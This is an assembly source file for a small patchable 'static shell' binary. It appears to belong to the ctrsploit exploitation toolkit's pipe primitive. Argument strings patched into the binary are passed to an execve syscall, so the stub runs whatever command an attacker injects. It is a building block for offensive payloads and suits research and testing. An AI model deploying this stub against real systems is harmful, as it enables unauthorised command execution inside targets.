// Source for material/static-shell-amd64.bin.
//
// Regenerate with:
//   go generate ./pkg/pipe-primitive

.global _start

.equ MAX_ARGS, 3
.equ ARG_BUF_SIZE, 256

.section .text
_start:
	lea arg_count_patch(%rip), %r8
	mov (%r8), %r9
	test %r9, %r9
	jle exit_fail
	cmp $MAX_ARGS, %r9
	jg exit_fail

	lea argv_space(%rip), %r10
	lea arg_patch(%rip), %r11
	xor %rcx, %rcx

argv_loop:
	cmp %r9, %rcx
	jge argv_done
	mov %r11, (%r10,%rcx,8)
	add $ARG_BUF_SIZE, %r11
	inc %rcx
	jmp argv_loop

argv_done:
	movq $0, (%r10,%r9,8)
	mov (%r10), %rdi
	mov %r10, %rsi
	xor %edx, %edx
	push $59
	pop %rax
	syscall

exit_fail:
	mov $60, %rax
	mov $127, %rdi
	syscall

.section .text
arg_marker:
	.ascii "CTRSPLOIT_STATIC_SHELL_ARGV_V1"
arg_count_patch:
	.quad 0
arg_patch:
	.zero MAX_ARGS * ARG_BUF_SIZE
argv_space:
	.zero (MAX_ARGS + 1) * 8
